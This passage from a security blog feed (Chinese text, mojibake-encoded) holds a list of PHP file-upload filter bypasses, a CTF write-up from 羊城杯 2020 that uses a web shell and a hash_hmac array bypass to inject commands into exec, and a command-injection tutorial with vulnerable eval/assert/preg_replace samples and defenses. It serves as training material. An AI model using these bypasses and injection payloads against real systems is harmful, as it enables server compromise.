<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.å…è®¸.jpg|.png|.gif</span><br><span class="line">ç»•è¿‡æ–¹æ³•ï¼šç¦ç”¨jsï¼Œæˆ–è€…æ·»åŠ |.phpå…è®¸é©¬ä¸Šä¼ ï¼Œæˆ–è€…ä¸Šä¼ jpgæ–‡ä»¶å†æŠ“åŒ…ä¿®æ”¹åç¼€ä¸º.php</span><br><span class="line">2.åªå¯¹content-typeè¿›è¡Œå¤„ç†ï¼Œå¯ä»¥ä¿®æ”¹ä¸ºå›¾ç‰‡çš„æ ¼å¼image&#x2F;jpegã€image&#x2F;pngã€image&#x2F;gif</span><br><span class="line">3.ç”¨é»‘åå•ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€çš„æ–‡ä»¶</span><br><span class="line">ä½†å¯ä»¥ä¸Šä¼ .phtml .phps .php5 .pht</span><br><span class="line">4.é»‘åå•è¿‡æ»¤é™¤äº†.htaccessæ‰€æœ‰çš„åç¼€åï¼Œå…ˆä¸Šä¼ .htaccessï¼Œå†ä¸Šä¼ jpgé©¬</span><br><span class="line">5.å¤§å°å†™æœªè¿‡æ»¤ï¼Œå¯ä»¥ç”¨å¤§å°å†™ç»•è¿‡WAF</span><br><span class="line">6.æœªå¯¹åç¼€åè¿›è¡Œå»ç©ºï¼Œå¯ä»¥åŠ ç©ºæ ¼ç»•è¿‡</span><br><span class="line">7.æœªå¯¹ç‚¹ç»•è¿‡ï¼Œå¯ä»¥ç”¨1.php.æ¥ç»•è¿‡ï¼Œåˆ©ç”¨windowsç‰¹æ€§ï¼Œä¼šè‡ªåŠ¨å»æ‰åç¼€åä¸­æœ€åçš„â€.â€</span><br><span class="line">8.æ²¡æœ‰å¯¹åç¼€åä¸­çš„â€™::$DATAâ€™è¿›è¡Œè¿‡æ»¤ï¼Œå¯ä»¥åœ¨åç¼€ååŠ ::$DATAç»•è¿‡æ–‡ä»¶å+&quot;::$DATA&quot;ä¼šæŠŠ::$DATAä¹‹åçš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†,ä¸ä¼šæ£€æµ‹åç¼€å</span><br><span class="line">9.åˆ©ç”¨1.php. .ï¼ˆç‚¹+ç©ºæ ¼+ç‚¹ï¼‰æ¥ç»•è¿‡</span><br><span class="line">10. $file_name &#x3D; str_ireplace($deny_ext,&quot;&quot;, $file_name);é»‘åå•è¿‡æ»¤å°†åç¼€åæ›¿æ¢ä¸ºç©ºï¼ŒåŒå†™å¯ä»¥ç»•è¿‡</span><br><span class="line">11.ç™½åå•åˆ¤æ–­$img_path &#x3D; $_GET[&#39;save_path&#39;].&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;ç›´æ¥æ‹¼æ¥ï¼Œå¯ä»¥ç”¨%00ç»•è¿‡</span><br><span class="line">12.save_pathå‚æ•°é€šè¿‡POSTæ–¹å¼ä¼ é€’ï¼Œè¿˜æ˜¯åˆ©ç”¨00æˆªæ–­ï¼Œå› ä¸ºPOSTä¸ä¼šåƒGETå¯¹%00è¿›è¡Œè‡ªåŠ¨è§£ç ï¼Œæ‰€ä»¥éœ€è¦åœ¨äºŒè¿›åˆ¶ä¸­è¿›è¡Œä¿®æ”¹</span><br><span class="line">13.getimagesizeå‡½æ•°åˆ¤æ–­æ–‡ä»¶ç±»å‹ï¼Œphp_exifæ¨¡å—æ¥åˆ¤æ–­æ–‡ä»¶ç±»å‹ï¼Œé€šè¿‡è¯»æ–‡ä»¶çš„å‰2ä¸ªå­—èŠ‚åˆ¤æ–­æ–‡ä»¶ç±»å‹ï¼Œéƒ½å¯ä»¥ç”¨å›¾ç‰‡é©¬çš„æ–¹å¼ç»•è¿‡</span><br><span class="line">14.äºŒæ¬¡æ¸²æŸ“ç»•è¿‡</span><br><span class="line">15.æ¡ä»¶ç«äº‰ï¼Œå…ˆå°†æ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œç„¶ååˆ¤æ–­æ–‡ä»¶åç¼€æ˜¯å¦åœ¨ç™½åå•é‡Œï¼Œå¦‚æœåœ¨åˆ™é‡å‘½åï¼Œå¦åˆ™åˆ é™¤ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä¸Šä¼ 1.phpåªéœ€è¦åœ¨å®ƒåˆ é™¤ä¹‹å‰è®¿é—®å³å¯ï¼Œå¯ä»¥åˆ©ç”¨burpçš„intruderæ¨¡å—ä¸æ–­ä¸Šä¼ ï¼Œç„¶åæˆ‘ä»¬ä¸æ–­çš„è®¿é—®åˆ·æ–°è¯¥åœ°å€å³å¯ï¼Œæœ‰moveå’ŒrenameFileå‡½æ•°çš„å¯ä»¥é€šè¿‡ä¸æ–­ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œç”±äºæ¡ä»¶ç«äº‰å¯èƒ½æ¥ä¸åŠé‡å‘½åï¼Œä»è€Œä¸Šä¼ æˆåŠŸã€‚</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>æ–‡ä»¶ä¸Šä¼ </tag>
      </tags>
  </entry>
  <entry>
    <title>ç¾ŠåŸæ¯2020</title>
    <url>/2020/09/11/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/</url>
    <content><![CDATA[<h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“<a id="more"></a></h3><p>è¿™æ¬¡æ¯”èµ›ï¼Œåšäº†ä¿©webï¼Œæœ‰ä¸€é“webæ€»æ„Ÿè§‰å·®ç‚¹ï¼Œä¸€ä¸ªäººæ‰“å¾ˆåƒåŠ›ï¼Œæ²¡é˜Ÿå‹äº¤æµæ€è·¯ï¼Œè‡ªå·±è¿˜æ˜¯èƒ½åŠ›æ¬ ç¼ºäº†ï¼Œæ€»å½’è¿˜æ˜¯æœ‰æ”¶è·çš„</p>
<h3 id="easycon"><a href="#easycon" class="headerlink" title="easycon"></a>easycon</h3><h4 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h4><ul>
<li>å°é©¬</li>
<li>base64æœ¬åœ°è½¬å›¾ç‰‡</li>
</ul>
<h4 id="è§£é¢˜æ­¥éª¤"><a href="#è§£é¢˜æ­¥éª¤" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h4><p>å¼€é¢˜</p>
<img src="/2020/09/11/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/1.png" class="">

<p>å°±æ˜¯ä¸€ä¸ªapacheçš„é…ç½®ä¿¡æ¯ï¼Œç›´æ¥æ”¹è®¿é—®index.php</p>
<img src="/2020/09/11/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/2.png" class="">

<p>æç¤ºpostä¸€ä¸ªcmdè¿‡å»ï¼Œçœ‹ä¸€ä¸‹ç½‘é¡µæºç </p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"> <span class="selector-tag">div</span><span class="selector-class">.main</span> &#123; <span class="attribute">margin-left</span>:auto; <span class="attribute">margin-right</span>:auto;  &#125; <span class="selector-tag">body</span> &#123; <span class="attribute">background-color</span>: 	<span class="number">#FAEBA7</span>; &#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">title</span>&gt;</span></span><br><span class="line">       welcome to YCBCTF</span><br><span class="line">     <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">gw2.jpg</span>  <span class="attr">width</span>=<span class="string">49%</span> <span class="attr">height</span>=<span class="string">60%</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">gw.jpg</span>  <span class="attr">width</span>=<span class="string">49%</span> <span class="attr">height</span>=<span class="string">60%</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'eval post cmd'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>çŒœæµ‹æ˜¯ä¸€ä¸ªå¯ä»¥è¿æ¥çš„shellï¼Œç›´æ¥æ‹¿èšå‰‘è¿æ¥</p>
<img src="/2020/09/11/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/3.png" class="">

<p>è¿ä¸Šåæ‰¾äº†æ ¹ç›®å½•ï¼Œæ²¡æœ‰æ‰¾åˆ°flagï¼Œå‘ç°åœ¨webæœåŠ¡ç›®å½•ä¸‹è¿˜æœ‰ä¸€ä¸ªtxtæ–‡ä»¶ï¼Œä¸‹è½½åˆ°æœ¬åœ°ï¼Œbase64è§£ç å¯ä»¥çœ‹åˆ°jfifçŒœæµ‹æ˜¯å›¾ç‰‡ï¼Œä½†æ˜¯è§£çš„ç ä¸èƒ½è¿˜åŸæˆå›¾ç‰‡ï¼Œæƒ³åˆ°ä¹‹å‰åšè¿‡çš„é¢˜ç›®ï¼Œåœ¨æµè§ˆå™¨æ‰“å¼€æ—¶ä¹Ÿæ˜¯è¿™æ ·çš„å½¢å¼ï¼Œè‡ªå·±æœ¬åœ°å†™ä¸€ä¸ª</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;&lt;!DOCTYPE html&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"IE=edge"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">	&lt;&lt;img src="data:image/png;base64,xxxxxxxxxxxxxx" alt=""&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>æŠŠtxtæ–‡ä»¶ä¸­çš„å†…å®¹æ›¿æ¢åœ¨xxxxxxxxå¤„å³å¯ï¼Œå†æœ¬åœ°èµ·ä¸€ä¸‹ç½‘é¡µ</p>
<img src="/2020/09/11/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/4.png" class="">

<p>flagåˆ°æ‰‹</p>
<h3 id="BlackCat"><a href="#BlackCat" class="headerlink" title="BlackCat"></a>BlackCat</h3><h4 id="çŸ¥è¯†ç‚¹-1"><a href="#çŸ¥è¯†ç‚¹-1" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h4><ul>
<li>stringså‘½ä»¤</li>
<li><code>hash_hmac</code>ç»•è¿‡</li>
</ul>
<h4 id="è§£é¢˜æ­¥éª¤-1"><a href="#è§£é¢˜æ­¥éª¤-1" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h4><p>å¼€é¢˜</p>
<img src="/2020/09/11/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/5.png" class="">

<p>æŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼Œæç¤ºå¬æ­Œï¼Œç›´æ¥æŠŠæ­Œä¸‹è¿‡æ¥ï¼Œä¸¢åˆ°kalié‡Œï¼Œç”¨stringså‘½ä»¤çœ‹ä¸€ä¸‹</p>
<img src="/2020/09/11/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/6.png" class="">

<p>å¯ä»¥çœ‹åˆ°æœ€åæœ‰æºç ï¼Œæ’•ä¸‹æ¥</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_POST[<span class="string">'Black-Cat-Sheriff'</span>]) || <span class="keyword">empty</span>($_POST[<span class="string">'One-ear'</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'è°ï¼ç«Ÿæ•¢è¸©æˆ‘ä¸€åªè€³çš„å°¾å·´ï¼'</span>);</span><br><span class="line">$clandestine = getenv(<span class="string">"clandestine"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'White-cat-monitor'</span>]))</span><br><span class="line">    $clandestine = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'White-cat-monitor'</span>], $clandestine);</span><br><span class="line">$hh = hash_hmac(<span class="string">'sha256'</span>, $_POST[<span class="string">'One-ear'</span>], $clandestine);</span><br><span class="line"><span class="keyword">if</span>($hh !== $_POST[<span class="string">'Black-Cat-Sheriff'</span>])&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">''</span>);</span><br><span class="line"><span class="keyword">echo</span> exec(<span class="string">"nc"</span>.$_POST[<span class="string">'One-ear'</span>]);</span><br></pre></td></tr></table></figure>

<p>è¦æƒ³æ‰§è¡Œåé¢çš„execï¼Œå°±å¾—ç»•è¿‡è¿™ä¸ªåˆ¤æ–­</p>
<p>æŸ¥æ‰¾èµ„æ–™ï¼Œæœ¬åœ°è°ƒè¯•ï¼Œå‘ç° <code>hash_hmac()</code>å‡½æ•°ä¼ å…¥çš„ç¬¬äºŒä¸ªå‚æ•°ä¸ºæ•°ç»„æ—¶ä¼šè¿”å›NULLï¼Œé‚£ä¹Ÿå°±æ˜¯è¯´åŠ å¯†ä¹‹åçš„<code>$clandestine</code>å¯æ§äº†ï¼ŒåŠ ä¸Š<code>$One-ear</code>å’Œ<code>$Black-Cat-Sheriff</code>éƒ½å¯æ§ï¼Œé‚£å°±ç®€å•äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$clandestine = hash_hmac(<span class="string">'sha256'</span>, $_GET[<span class="string">'2'</span>], $clandestine);</span><br><span class="line">var_dump($clandestine);</span><br><span class="line">$hh = hash_hmac(<span class="string">'sha256'</span>, $_GET[<span class="string">'1'</span>], $clandestine);</span><br><span class="line">var_dump($hh);</span><br><span class="line"><span class="keyword">echo</span> exec(<span class="string">"nc"</span>.$_GET[<span class="string">'cmd'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æœ¬åœ°è¿›è¡ŒåŠ å¯†ï¼Œå†è¿›è¡Œä¼ å‚ï¼Œè¿™é‡Œçš„<code>nc</code>å¼€å§‹æˆ‘ä»¥ä¸ºè¦è°ˆä¸ªshellåˆ°æœ¬åœ°ï¼Œè¯•äº†ä¸€ä¸‹ä¸è¡Œï¼Œåæ¥å‘ç°<code>;</code>å¯ä»¥é˜»æ–­<code>nc</code>å‘½ä»¤ï¼Œåé¢æ‹¼æ¥è‡ªå·±æƒ³è¦ä½¿ç”¨çš„å‘½ä»¤ï¼Œè¿™é‡Œç”±äºè¿”å›ç»“æœåªæœ‰ä¸€è¡Œï¼Œæ‰€ä»¥ç”¨<code>find</code>å‘½ä»¤æŸ¥æ‰¾flagæ–‡ä»¶å³å¯ï¼Œç›´æ¥ç»™æœ€åçš„ç»“æœå›¾</p>
<img src="/2020/09/11/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/7.png" class="">

]]></content>
      <tags>
        <tag>ç¾ŠåŸæ¯</tag>
      </tags>
  </entry>
  <entry>
    <title>é€»è¾‘æ¼æ´</title>
    <url>/2020/01/15/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h3 id="1-åŸç†"><a href="#1-åŸç†" class="headerlink" title="1.åŸç†"></a>1.åŸç†<a id="more"></a></h3><p>å‘½ä»¤æ‰§è¡Œæ¼æ´æ˜¯æŒ‡åº”ç”¨æœ‰æ—¶éœ€è¦è°ƒç”¨ä¸€äº›æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°ï¼Œå¦‚ï¼š<code>system()ã€exec()ã€shell_exec()ã€eval()ã€passthru()</code>ï¼Œä»£ç æœªå¯¹ç”¨æˆ·å¯æ§å‚æ•°åšè¿‡æ»¤ï¼Œå½“ç”¨æˆ·èƒ½æ§åˆ¶è¿™äº›å‡½æ•°ä¸­çš„å‚æ•°æ—¶ï¼Œå°±å¯ä»¥å°†æ¶æ„ç³»ç»Ÿå‘½ä»¤æ‹¼æ¥åˆ°æ­£å¸¸å‘½ä»¤ä¸­ï¼Œä»è€Œé€ æˆå‘½ä»¤æ‰§è¡Œæ”»å‡»ã€‚</p>
<h3 id="å¸¸è§è¿æ¥ç¬¦"><a href="#å¸¸è§è¿æ¥ç¬¦" class="headerlink" title="*å¸¸è§è¿æ¥ç¬¦"></a>*å¸¸è§è¿æ¥ç¬¦</h3><table>
<thead>
<tr>
<th>A;B</th>
<th>å…ˆæ‰§è¡ŒAï¼Œå†æ‰§è¡ŒB</th>
</tr>
</thead>
<tbody><tr>
<td>A&amp;B</td>
<td>ABä¸¤ä¸ªæ— åˆ¶çº¦å…³ç³»ï¼Œéƒ½å¯ä»¥æ‰§è¡Œ</td>
</tr>
<tr>
<td>A|B</td>
<td>Aä¸æ‰§è¡Œï¼ŒBæ‰§è¡Œï¼Œåªæ˜¾ç¤ºBçš„æ‰§è¡Œç»“æœ</td>
</tr>
<tr>
<td>A&amp;&amp;B</td>
<td>Aæ‰§è¡ŒæˆåŠŸæ‰ä¼šæ‰§è¡ŒB</td>
</tr>
<tr>
<td>A||B</td>
<td>Aæ‰§è¡Œå¤±è´¥ï¼Œç„¶åæ‰ä¼šæ‰§è¡ŒB</td>
</tr>
</tbody></table>
<h3 id="2-åˆ†ç±»"><a href="#2-åˆ†ç±»" class="headerlink" title="2.åˆ†ç±»"></a>2.åˆ†ç±»</h3><h4 id="1â€˜-ä»£ç å±‚è¿‡æ»¤ä¸ä¸¥"><a href="#1â€˜-ä»£ç å±‚è¿‡æ»¤ä¸ä¸¥" class="headerlink" title="1â€˜.ä»£ç å±‚è¿‡æ»¤ä¸ä¸¥"></a>1â€˜.ä»£ç å±‚è¿‡æ»¤ä¸ä¸¥</h4><p>å•†ä¸šåº”ç”¨çš„ä¸€äº›æ ¸å¿ƒä»£ç å°è£…åœ¨äºŒè¿›åˆ¶æ–‡ä»¶ä¸­ï¼Œåœ¨WEBåº”ç”¨ä¸­é€šè¿‡systemå‡½æ•°æ¥è°ƒç”¨: <code>system(&quot;bin/program/--arg $arg&quot;);</code></p>
<h4 id="2â€™-ç³»ç»Ÿçš„æ¼æ´é€ æˆå‘½ä»¤æ³¨å…¥"><a href="#2â€™-ç³»ç»Ÿçš„æ¼æ´é€ æˆå‘½ä»¤æ³¨å…¥" class="headerlink" title="2â€™.ç³»ç»Ÿçš„æ¼æ´é€ æˆå‘½ä»¤æ³¨å…¥"></a>2â€™.ç³»ç»Ÿçš„æ¼æ´é€ æˆå‘½ä»¤æ³¨å…¥</h4><p>bashç ´å£³æ¼æ´(CVE-2013-6271)</p>
<h4 id="3â€™-è°ƒç”¨çš„ç¬¬ä¸‰æ–¹ç»„ä»¶å­˜åœ¨ä»£ç æ‰§è¡Œæ¼æ´"><a href="#3â€™-è°ƒç”¨çš„ç¬¬ä¸‰æ–¹ç»„ä»¶å­˜åœ¨ä»£ç æ‰§è¡Œæ¼æ´" class="headerlink" title="3â€™.è°ƒç”¨çš„ç¬¬ä¸‰æ–¹ç»„ä»¶å­˜åœ¨ä»£ç æ‰§è¡Œæ¼æ´"></a>3â€™.è°ƒç”¨çš„ç¬¬ä¸‰æ–¹ç»„ä»¶å­˜åœ¨ä»£ç æ‰§è¡Œæ¼æ´</h4><p>wordpressä¸­ç”¨æ¥å¤„ç†å›¾ç‰‡çš„ImageMagickç»„ä»¶</p>
<p>JAVAä¸­çš„å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆstruts2/ElasticsearchGroovyç­‰ï¼‰</p>
<p>ThinkPHPå‘½ä»¤æ‰§è¡Œæ¼æ´</p>
<h3 id="3-é˜²å¾¡"><a href="#3-é˜²å¾¡" class="headerlink" title="3.é˜²å¾¡"></a>3.é˜²å¾¡</h3><p>1.å°½é‡å°‘ç”¨æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°æˆ–è€…ç›´æ¥ç¦ç”¨<br>2.å‚æ•°å€¼å°½é‡ä½¿ç”¨å¼•å·åŒ…æ‹¬ï¼Œåœ¨æ‹¼æ¥ä¹‹å‰è°ƒç”¨addslasheså‡½æ•°è¿›è¡Œè½¬ä¹‰<br>3.åœ¨ä½¿ç”¨åŠ¨æ€å‡½æ•°ä¹‹å‰ï¼Œç¡®ä¿ä½¿ç”¨çš„å‡½æ•°æ˜¯æŒ‡å®šçš„å‡½æ•°ä¹‹ä¸€<br>4.åœ¨è¿›å…¥æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°æ–¹æ³•ä¹‹å‰ï¼Œå¯¹å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼Œå¯¹æ•æ„Ÿå­—ç¬¦è¿›è¡Œè½¬ä¹‰<br>5.å¯¹äºå¯æ§ç‚¹æ˜¯ç¨‹åºå‚æ•°çš„æƒ…å†µä¸‹ï¼Œä½¿ç”¨escapeshellcmdå‡½æ•°è¿›è¡Œè¿‡æ»¤ï¼Œå¯¹äºå¯æ§ç‚¹æ˜¯ç¨‹åºå‚æ•°å€¼çš„æƒ…å†µä¸‹ï¼Œä½¿ç”¨escapeshellargå‡½æ•°è¿›è¡Œè¿‡æ»¤</p>
<h4 id="ä¸‹é¢æ˜¯æ¶‰åŠåˆ°çš„çŸ¥è¯†ç‚¹ï¼ˆä¸ªäººè®¤ä¸ºï¼‰"><a href="#ä¸‹é¢æ˜¯æ¶‰åŠåˆ°çš„çŸ¥è¯†ç‚¹ï¼ˆä¸ªäººè®¤ä¸ºï¼‰" class="headerlink" title="ä¸‹é¢æ˜¯æ¶‰åŠåˆ°çš„çŸ¥è¯†ç‚¹ï¼ˆä¸ªäººè®¤ä¸ºï¼‰"></a>ä¸‹é¢æ˜¯æ¶‰åŠåˆ°çš„çŸ¥è¯†ç‚¹ï¼ˆä¸ªäººè®¤ä¸ºï¼‰</h4><h3 id="1-åˆ©ç”¨ç³»ç»Ÿå‡½æ•°å®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œ"><a href="#1-åˆ©ç”¨ç³»ç»Ÿå‡½æ•°å®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="1.åˆ©ç”¨ç³»ç»Ÿå‡½æ•°å®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œ"></a>1.åˆ©ç”¨ç³»ç»Ÿå‡½æ•°å®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œ</h3><p>åœ¨PHPä¸‹ï¼Œå…è®¸å‘½ä»¤æ‰§è¡Œçš„å‡½æ•°æœ‰ï¼š</p>
<p><code>eval()</code></p>
<p><code>assert()</code></p>
<p><code>preg_replace()</code></p>
<p><code>call_user_func()</code></p>
<p><code>ob_start()ã€unserialize()ã€creat_function()</code><br><code>usort()ã€uasort()ã€uksort()</code><br><code>array_filter()</code><br><code>array_reduce()</code><br><code>array_map()</code><br><code>...</code></p>
<h4 id="eval-å‡½æ•°"><a href="#eval-å‡½æ•°" class="headerlink" title="eval()å‡½æ•°"></a>eval()å‡½æ•°</h4><p>å®šä¹‰å’Œç”¨æ³•</p>
<p>eval()å‡½æ•°æŠŠå­—ç¬¦ä¸²æŒ‰ç…§PHPä»£ç æ¥è®¡ç®—ï¼Œè¯¥å­—ç¬¦ä¸²å¿…é¡»åˆæ³•ä¸”ä»¥åˆ†å·ç»“å°¾</p>
<p>è‹¥æœªåœ¨å­—ç¬¦ä¸²ä¸­è°ƒç”¨returnè¯­å¥ï¼Œè¿”å›NULL,å­˜åœ¨è§£æé”™è¯¯ï¼Œè¿”å›false</p>
<p>è¯­æ³•<br>eval(phpcode)ï¼Œphpcode å¿…éœ€ï¼Œè§„å®šè¦è®¡ç®—çš„ PHP ä»£ç ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">'a'</span>];</span><br><span class="line"><span class="keyword">eval</span>($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/oscommand/1.php?a=phpinfo();</span><br></pre></td></tr></table></figure>

<h4 id="assert-å‡½æ•°"><a href="#assert-å‡½æ•°" class="headerlink" title="assert()å‡½æ•°"></a>assert()å‡½æ•°</h4><p>å®šä¹‰å’Œç”¨æ³•<br>æ£€æŸ¥ä¸€ä¸ªæ–­è¨€æ˜¯å¦ä¸º FALSE</p>
<p>è¯­æ³•</p>
<p>PHP 5<br>bool assert ( mixed description ] )<br>PHP 7<br>bool assert ( mixed exception ] )<br>assert() ä¼šæ£€æŸ¥æŒ‡å®šçš„ assertion å¹¶åœ¨ç»“æœä¸º FALSE æ—¶é‡‡å–é€‚å½“çš„è¡ŒåŠ¨</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">'a'</span>];</span><br><span class="line">assert($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/oscommand/1.php?a=phpinfo();</span><br><span class="line">http://127.0.0.1/oscommand/1.php?a=phpinfo()</span><br></pre></td></tr></table></figure>

<h4 id="preg-replace-å‡½æ•°"><a href="#preg-replace-å‡½æ•°" class="headerlink" title="preg_replace()å‡½æ•°"></a>preg_replace()å‡½æ•°</h4><p>å®šä¹‰<br>preg_replace å‡½æ•°æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢ã€‚</p>
<p>è¯­æ³•<br>mixed preg_replace ( mixed replacement , mixed limit = -1 [, int &amp;$count ]] )<br>æœç´¢ subject ä¸­åŒ¹é… pattern çš„éƒ¨åˆ†ï¼Œ ä»¥ replacement è¿›è¡Œæ›¿æ¢ã€‚<br>å‚æ•°è¯´æ˜ï¼š</p>
<p>patternå¤„å­˜åœ¨ä¸€ä¸ªâ€/eâ€ä¿®é¥°ç¬¦æ—¶ï¼Œ$replacementçš„å€¼ä¼šè¢«å½“æˆphpä»£ç æ¥æ‰§è¡Œã€‚<br>$replacement: ç”¨äºæ›¿æ¢çš„å­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²æ•°ç»„ã€‚<br>$subject: è¦æœç´¢æ›¿æ¢çš„ç›®æ ‡å­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²æ•°ç»„ã€‚<br>$limit: å¯é€‰ï¼Œå¯¹äºæ¯ä¸ªæ¨¡å¼ç”¨äºæ¯ä¸ª subject å­—ç¬¦ä¸²çš„æœ€å¤§å¯æ›¿æ¢æ¬¡æ•°ã€‚ é»˜è®¤æ˜¯-1ï¼ˆæ— é™åˆ¶ï¼‰ã€‚<br>$count: å¯é€‰ï¼Œä¸ºæ›¿æ¢æ‰§è¡Œçš„æ¬¡æ•°ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">'a'</span>];</span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="string">"/test/e"</span>, $a, <span class="string">"just test!"</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;oscommand&#x2F;1.php?a&#x3D;phpinfo()</span><br></pre></td></tr></table></figure>

<h4 id="call-user-func-å‡½æ•°"><a href="#call-user-func-å‡½æ•°" class="headerlink" title="call_user_func()å‡½æ•°"></a>call_user_func()å‡½æ•°</h4><p>å®šä¹‰å’Œç”¨æ³•<br>call_user_func â€” æŠŠç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°è°ƒç”¨</p>
